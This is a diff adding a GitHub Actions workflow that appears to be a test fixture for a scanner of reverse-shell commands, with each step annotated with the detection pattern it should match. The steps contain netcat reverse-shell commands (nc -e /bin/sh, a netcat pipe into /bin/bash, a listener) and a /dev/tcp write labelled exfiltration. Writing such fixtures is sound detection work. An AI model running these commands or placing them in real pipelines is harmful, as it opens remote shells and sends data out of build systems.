@@ -1,0 +1,33 @@
+name: automation_reverse_shell_usage_workflow_1747806381-66ehgn
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  reverse_shell_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Direct Netcat Connection  # ❌ Matches (nc|netcat) <IP>
+        run: |
+          nc 192.168.1.100 4444  # ❌ Direct netcat connection
+
+      - name: Netcat with Execute Flag  # ❌ Matches (nc|netcat) -e
+        run: |
+          netcat -e /bin/sh 192.168.1.100 9999  # ❌ Executes a shell via netcat
+
+      - name: Netcat in Listen Mode  # ❌ Matches (nc|netcat) -l
+        run: |
+          nc -lvnp 4444  # ❌ Opens a backdoor listener
+
+      - name: Netcat Piped to Shell  # ❌ Matches (nc|netcat) | /bin/sh
+        run: |
+          nc 192.168.1.200 5555 | /bin/bash  # ❌ Remote command execution
+
+      - name: Netcat with TCP Device  # ❌ Matches (nc|netcat) > /dev/tcp/
+        run: |
+          echo "Malicious Payload" > /dev/tcp/192.168.1.250/4444  # ❌ Data exfiltration
